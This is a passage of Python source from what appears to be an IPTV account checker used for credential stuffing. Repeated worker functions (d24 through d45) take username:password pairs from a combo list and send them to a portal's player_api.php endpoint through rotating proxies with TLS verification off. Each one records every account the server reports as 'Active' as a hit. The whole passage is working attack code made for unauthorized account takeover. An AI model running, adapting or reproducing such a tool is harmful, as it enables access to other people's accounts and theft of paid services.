							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)

def d24():
	global hit
	global proxy_
	say=0
	for fyz in range(24,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='24'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)

def d25():
	global hit
	global proxy_
	say=0
	for fyz in range(25,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='25'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)

def d26():
	global hit
	global proxy_
	say=0
	for fyz in range(26,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='26'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas) 

def d27():
	global hit
	global proxy_
	say=0
	for fyz in range(27,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='27'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)   

def d28():
	global hit
	global proxy_
	say=0
	for fyz in range(28,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='28'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)

def d29():
	global hit
	global proxy_
	say=0
	for fyz in range(29,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='29'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)

def d30():
	global hit
	global proxy_
	say=0
	for fyz in range(30,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='30'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)                    
            
def d31():
	global hit
	global proxy_
	say=0
	for fyz in range(31,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='31'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
                    
def d32():
	global hit
	global proxy_
	say=0
	for fyz in range(32,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='32'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
                    
def d33():
	global hit
	global proxy_
	say=0
	for fyz in range(33,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='33'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
                    
def d34():
	global hit
	global proxy_
	say=0
	for fyz in range(34,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='34'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
                    
def d35():
	global hit
	global proxy_
	say=0
	for fyz in range(35,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='35'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
                    
def d36():
	global hit
	global proxy_
	say=0
	for fyz in range(36,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='36'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
                    
def d37():
	global hit
	global proxy_
	say=0
	for fyz in range(37,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='37'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
                    
def d38():
	global hit
	global proxy_
	say=0
	for fyz in range(38,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='38'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)

def d39():
	global hit
	global proxy_
	say=0
	for fyz in range(39,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='39'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)

def d40():
	global hit
	global proxy_
	say=0
	for fyz in range(40,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='40'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)

def d41():
	global hit
	global proxy_
	say=0
	for fyz in range(41,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='41'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)

def d42():
	global hit
	global proxy_
	say=0
	for fyz in range(42,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='42'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)

def d43():
	global hit
	global proxy_
	say=0
	for fyz in range(43,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='43'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)

def d44():
	global hit
	global proxy_
	say=0
	for fyz in range(44,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='44'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)

def d45():
	global hit
	global proxy_
	say=0
	for fyz in range(45,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='45'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
